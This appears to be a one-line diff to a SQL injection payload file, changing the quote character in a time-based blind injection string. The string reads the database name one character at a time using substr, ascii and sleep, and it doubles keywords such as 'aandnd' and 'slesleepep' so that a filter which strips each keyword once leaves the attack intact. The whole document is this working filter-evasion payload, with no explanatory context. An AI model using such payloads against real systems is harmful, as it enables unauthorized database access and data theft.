@@ -1,1 +1,1 @@
-admin' aandnd iiff(asasciicii(subsubstrstr(database(),len,1))=size,slesleepep(1),1)#
+admin\" aandnd iiff(asasciicii(subsubstrstr(database(),len,1))=size,slesleepep(1),1)#
